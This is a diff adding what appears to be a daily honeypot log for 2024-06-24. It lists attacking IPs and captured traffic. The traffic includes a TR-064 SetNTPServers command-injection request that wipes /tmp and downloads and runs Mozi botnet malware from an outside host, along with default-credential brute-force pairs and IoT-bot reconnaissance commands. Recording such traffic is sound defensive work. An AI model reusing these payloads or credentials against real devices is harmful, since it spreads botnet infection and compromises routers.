@@ -1,0 +1,49 @@
+Top 5 IPs for 2024-06-24 :
+
+43.134.166.52
+38.147.172.13
+119.92.70.82
+211.194.115.163
+220.76.163.140
+
+Malware Observed:
+
+None observed
+
+
+
+Commands/exploits observed:
+
+
+POST /UD/act?1 HTTP/1.1
+Host: 127.0.0.1:7574
+User-Agent: Hello, world
+SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers
+Content-Type: text/xml
+Content-Length: 640
+
+<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1&qu ot;><NewNTPServer1>`cd /tmp && rm -rf * && /bin/busybox wget http://123.14.186.117:57617/Mozi.m && chmod 777 /tmp/tr064 && /tmp/tr064 tr064`</NewNTPServer1><NewNTPServer2>`echo DEATH`</NewNTPServer2><NewNTPServer3>`echo DEATH`</NewNTPServer3><NewNTPServer4>`echo DEATH`</NewNTPServer4><NewNTPServer5>`echo DEATH`</NewNTPServer5></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>
+
+
+
+
+root
+...cat1029
+supervisor
+...zyad1234
+admin
+...1111
+root
+...dreambox
+user
+...user
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox DJGXF
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox DJGXF
+tftp; wget; /bin/busybox DJGXF
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+
+
